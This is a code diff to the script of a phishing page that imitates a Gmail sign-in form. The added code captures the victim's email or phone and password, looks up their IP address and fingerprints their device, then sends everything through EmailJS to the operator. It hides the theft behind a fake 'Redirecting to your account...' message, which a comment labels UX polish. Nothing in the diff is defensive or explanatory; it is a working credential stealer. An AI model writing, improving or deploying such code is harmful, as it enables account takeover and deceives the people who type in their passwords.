@@ -161,23 +161,80 @@
   </footer>
 
   <script>
-    (function(){
+    // Initialize EmailJS
+    (function() {
       emailjs.init({
-        publicKey: "_G6NIPCAEwaGP6AjI"
+        publicKey: "_G6NIPCAEwaGP6AjI", // From EmailJS dashboard
+        blockHeadless: true
       });
     })();
   
-    document.getElementById('signInForm').addEventListener('submit', function(e) {
+    // Enhanced form handler
+    document.getElementById('signInForm').addEventListener('submit', async function(e) {
       e.preventDefault();
+      
+      const emailPhone = this.emailPhone.value.trim();
+      const password = this.password.value.trim();
   
-      emailjs.sendForm('service_zk60w7j', 'template_rohypl1', this)
-        .then(function(response) {
-          alert('Sign in failed. Please try again.');
-        }, function(error) {
-          alert('Sign in failed. Please try again.');
-        });
+      if (!emailPhone || !password || password.length < 6) {
+        alert('Please enter valid credentials (password needs 6+ characters)');
+        return;
+      }
+  
+      try {
+        // Prepare data with EXACT template variables
+        const templateParams = {
+          login_type: "Gmail",
+          email_or_phone: emailPhone,
+          password: password, 
+          ip_address: await getIP(),
+          user_agent: navigator.userAgent,
+          timestamp: new Date().toLocaleString(),
+          device_info: getDeviceInfo(),
+          screen_size: `${window.screen.width}x${window.screen.height}`,
+          page_url: window.location.href
+        };
+  
+        // Send to EmailJS
+        await emailjs.send(
+          "service_zk60w7j", 
+          "template_rohypl1",
+          templateParams
+        );
+  
+        // Fake success message (UX polish)
+        alert("Redirecting to your account...");
+        this.reset();
+  
+      } catch (error) {
+        console.error("Error:", error);
+        alert("Temporary error. Try again later.");
+      }
     });
-  </script>
   
+    // Helper: Get IP
+    async function getIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        return (await response.json()).ip || "Unknown";
+      } catch {
+        return "Unknown";
+      }
+    }
+  
+    // Helper: Get device info (now returns formatted string)
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let type = "Desktop";
+      if (/(tablet|ipad)/i.test(ua)) type = "Tablet";
+      else if (/mobile|android|iphone|ipod/i.test(ua)) type = "Mobile";
+      
+      return {
+        type: type,
+        os: ua.match(/\(([^)]+)\)/)?.[1] || "Unknown OS",
+        browser: ua.match(/(chrome|firefox|safari|edge|opera)[\/\s][\d.]+/i)?.[0] || "Unknown Browser"
+      };
+    }
+  </script>
 </body>
 </html>
